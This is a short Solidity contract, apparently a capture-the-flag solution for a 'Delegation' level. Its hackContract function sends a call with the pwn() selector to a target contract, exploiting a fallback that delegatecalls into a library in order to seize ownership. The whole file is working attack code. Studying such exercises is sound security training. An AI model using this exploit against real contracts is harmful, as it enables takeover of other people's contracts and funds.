// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;        
    }

    function hackContract() external {
        bytes4 func_selector = bytes4(keccak256("pwn()"));
        contractAddress.call(abi.encodeWithSelector(func_selector));        
    }
}
